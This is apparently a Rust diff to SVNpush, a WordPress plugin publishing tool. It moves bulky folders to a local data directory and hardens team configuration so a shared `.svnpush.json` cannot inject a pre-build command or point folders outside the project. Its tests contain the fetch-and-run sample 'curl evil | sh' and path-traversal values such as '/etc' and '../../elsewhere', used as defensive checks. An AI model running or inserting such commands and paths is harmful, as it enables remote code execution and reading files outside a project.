@@ -19,15 +19,24 @@ pub const SCHEMA: u32 = 1;
 pub const DEFAULT_ASSETS_FOLDER: &str = ".wordpress-org";
 
 /// Every folder SVNpush writes under the app data directory (plan §6.3).
+/// Working copies and builds, which can be regenerated, may live under a
+/// separate local (non-roaming) folder.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub struct AppPaths {
     root: PathBuf,
+    local: PathBuf,
 }
 
 impl AppPaths {
     /// Paths under `<app-data>/svnpush`.
     pub fn new(app_data: &Path) -> Self {
-        Self { root: app_data.join("svnpush") }
+        Self::with_local(app_data, app_data)
+    }
+
+    /// Configuration, journals and snapshots under `<app-data>/svnpush`;
+    /// working copies and builds under `<local-data>/svnpush`.
+    pub fn with_local(app_data: &Path, local_data: &Path) -> Self {
+        Self { root: app_data.join("svnpush"), local: local_data.join("svnpush") }
     }
 
     /// The `svnpush` folder itself.
@@ -57,12 +66,12 @@ impl AppPaths {
 
     /// `wc/<slug>/`, the sparse working copy.
     pub fn working_copy(&self, slug: &str) -> PathBuf {
-        self.root.join("wc").join(slug)
+        self.local.join("wc").join(slug)
     }
 
     /// `builds/`
     pub fn builds(&self) -> PathBuf {
-        self.root.join("builds")
+        self.local.join("builds")
     }
 
     /// `runs/<slug>/`
@@ -324,8 +333,53 @@ pub fn save_projects(paths: &AppPaths, projects: &[Project]) -> Result<(), Confi
 /// Provider record ids exist on one machine, so the AI choice is local too.
 const MACHINE_SPECIFIC: [&str; 2] = ["svn_account", "ai_provider"];
 
+/// The team file cannot set a command to run: anyone who can push to the
+/// repository could otherwise run code on every developer's machine. The
+/// command in the developer's own settings is used; see
+/// [`team_pre_build_command`] for offering the team's.
+const TEAM_COMMAND: &str = "pre_build_command";
+
+/// Checks that a folder setting stays inside the project folder: no
+/// absolute path, drive, or `..`. `Err` holds the reason.
+fn check_inside(field: &str, value: &str) -> Result<(), String> {
+    let escapes = Path::new(value).is_absolute()
+        || value.starts_with(['/', '\\'])
+        || value.contains(':')
+        || value.split(['/', '\\']).any(|part| part == "..");
+    if escapes {
+        Err(format!("{field} \"{value}\" must be a folder inside the project, such as dist"))
+    } else {
+        Ok(())
+    }
+}
+
+/// Checks the folder settings: the package root and the assets folder must
+/// stay inside the project folder. `Err` holds the reason, for the UI.
+pub fn validate_settings(settings: &ProjectSettings) -> Result<(), String> {
+    check_inside("package_root", settings.package_root.trim().trim_matches(['/', '\\']))?;
+    check_inside("assets_folder", settings.assets_folder.as_deref().unwrap_or_default())
+}
+
+/// The pre-build command `.svnpush.json` proposes, when it differs from the
+/// one in the developer's own settings. It never runs until the developer
+/// saves it in Project settings.
+pub fn team_pre_build_command(project: &Project) -> Result<Option<String>, ConfigError> {
+    let file = PathBuf::from(&project.path).join(PROJECT_CONFIG_FILE);
+    let Some(team) = read_json::<Value>(&file)? else { return Ok(None) };
+    let proposed = team
+        .get("settings")
+        .and_then(|s| s.get(TEAM_COMMAND))
+        .and_then(Value::as_str)
+        .map(str::trim)
+        .filter(|c| !c.is_empty());
+    let local = project.settings.pre_build_command.as_deref().map(str::trim);
+    Ok(proposed.filter(|c| Some(*c) != local).map(str::to_owned))
+}
+
 /// The project with `.svnpush.json` overlaid: team values override app values,
-/// key by key. The file's `svn_url` overrides too; machine-specific keys are ignored.
+/// key by key. The file's `svn_url` overrides too (and the slug follows it);
+/// machine-specific keys and the pre-build command are ignored, and folder
+/// settings must stay inside the project.
 pub fn with_team_config(project: &Project) -> Result<Project, ConfigError> {
     let file = PathBuf::from(&project.path).join(PROJECT_CONFIG_FILE);
     let Some(team) = read_json::<Value>(&file)? else {
@@ -339,6 +393,8 @@ pub fn with_team_config(project: &Project) -> Result<Project, ConfigError> {
 
     let mut merged = project.clone();
     if let Some(url) = team.get("svn_url").and_then(Value::as_str) {
+        merged.slug = crate::detect::slug_from_svn_url(url)
+            .ok_or_else(|| invalid(format!("svn_url \"{url}\" does not end in a plugin slug")))?;
         url.clone_into(&mut merged.svn_url);
     }
     if let Some(Value::Object(overrides)) = team.get("settings") {
@@ -346,12 +402,13 @@ pub fn with_team_config(project: &Project) -> Result<Project, ConfigError> {
             serde_json::to_value(&project.settings).map_err(|e| invalid(e.to_string()))?;
         if let Value::Object(fields) = &mut base {
             for (key, value) in overrides {
-                if !MACHINE_SPECIFIC.contains(&key.as_str()) {
+                if !MACHINE_SPECIFIC.contains(&key.as_str()) && key != TEAM_COMMAND {
                     fields.insert(key.clone(), value.clone());
                 }
             }
         }
         merged.settings = serde_json::from_value(base).map_err(|e| invalid(e.to_string()))?;
+        validate_settings(&merged.settings).map_err(invalid)?;
     }
     Ok(merged)
 }
@@ -410,6 +467,49 @@ mod tests {
         assert!(!merged.settings.post_publish_open_page);
         assert_eq!(merged.settings.svn_account.as_deref(), Some("me"));
         assert_eq!(merged.settings.pre_build_command.as_deref(), Some("npm run build"));
+    }
+
+    #[test]
+    fn team_config_cannot_add_a_command_or_escape_the_project() {
+        let dir = tempfile::tempdir().unwrap();
+        let mut p = project(dir.path());
+        let team = dir.path().join(".svnpush.json");
+        std::fs::write(
+            &team,
+            r#"{"svn_url": "https://plugins.svn.wordpress.org/other/", "settings": {"pre_build_command": "curl evil | sh"}}"#,
+        )
+        .unwrap();
+        let merged = with_team_config(&p).unwrap();
+        assert_eq!(merged.slug, "other", "the slug follows the team's SVN URL");
+        assert_eq!(merged.settings.pre_build_command, None);
+        assert_eq!(team_pre_build_command(&p).unwrap().as_deref(), Some("curl evil | sh"));
+        p.settings.pre_build_command = Some("curl evil | sh".into());
+        assert_eq!(team_pre_build_command(&p).unwrap(), None, "already the developer's own");
+
+        for bad in [
+            r#"{"settings": {"package_root": "../../elsewhere"}}"#,
+            r#"{"settings": {"assets_folder": "/etc"}}"#,
+            r#"{"settings": {"assets_folder": "C:\\Windows"}}"#,
+            r#"{"svn_url": "https://plugins.svn.wordpress.org/"}"#,
+        ] {
+            std::fs::write(&team, bad).unwrap();
+            assert_eq!(with_team_config(&p).unwrap_err().code(), "CONFIG_INVALID", "{bad}");
+        }
+        let mut settings = ProjectSettings { package_root: "/dist/".into(), ..Default::default() };
+        assert!(validate_settings(&settings).is_ok());
+        settings.assets_folder = Some("assets/../..".into());
+        assert!(validate_settings(&settings).unwrap_err().contains("assets_folder"));
+    }
+
+    #[test]
+    fn bulk_folders_can_live_under_a_local_root() {
+        let paths = AppPaths::with_local(Path::new("/roaming"), Path::new("/local"));
+        assert!(paths.working_copy("demo").starts_with("/local/svnpush"));
+        assert!(paths.builds().starts_with("/local/svnpush"));
+        assert!(paths.runs("demo").starts_with("/roaming/svnpush"));
+        assert!(paths.projects_file().starts_with("/roaming/svnpush"));
+        let same = AppPaths::new(Path::new("/data"));
+        assert!(same.working_copy("demo").starts_with("/data/svnpush"));
     }
 
     #[test]
